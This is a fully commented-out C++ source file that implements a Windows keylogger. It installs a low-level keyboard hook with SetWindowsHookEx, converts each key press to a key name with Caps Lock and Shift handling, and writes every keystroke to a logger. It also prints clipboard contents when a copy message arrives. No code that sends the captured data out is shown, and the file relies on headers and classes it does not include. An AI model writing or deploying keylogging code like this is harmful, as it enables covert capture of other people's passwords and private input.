//#include "keylogger.h"
//
////L10n l10n;
////std::once_flag flag;
////Clipboard _clipboard;
//
//LRESULT CALLBACK hookProc(int nCode, WPARAM wParam, LPARAM lParam)
//{
//    //std::call_once(flag, 
//    //    []()
//    //{
//    //    // save information about first start a program
//    //});
//
//    //if (wParam == WM_KEYDOWN)
//    //{
//    //    PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);
//    //    unsigned int scan = MapVirtualKey(p->vkCode, 0);
//    //    scan <<= 16;
//
//    //    const bool is_ascii = p->vkCode <= 32;
//    //    if (!is_ascii)
//    //        scan |= 0x1 << 24;
//
//    //    TCHAR buf[16];
//    //    GetKeyNameText(scan, buf, 16);
//
//    //    std::wstring key = buf;
//
//    //    if (!Keylogger::is_caps())
//    //        std::transform(key.begin(), key.end(), key.begin(), ::tolower);
//
//    //    const auto value = l10n.translate(key);
//    //    if ( value.empty() )
//    //        logger << key;
//    //    else
//    //        logger << value;
//    //}
//    //if (wParam == WM_COPY)
//    //{
//    //    std::cout << _clipboard.get() << std::endl;
//    //}
//    return CallNextHookEx(NULL, nCode, wParam, lParam);
//}
//
//void Keylogger::trap(HINSTANCE instance)
//{
//    _keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, instance, 0);
//}
//
//void Keylogger::leave()
//{
//    UnhookWindowsHookEx(_keyboard_hook);
//}
//
//bool Keylogger::is_caps()
//{
//    const bool is_capital = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
//    const bool is_shift = ((GetKeyState(VK_SHIFT) & 0x8000) != 0);
//    return is_shift || is_capital;
//}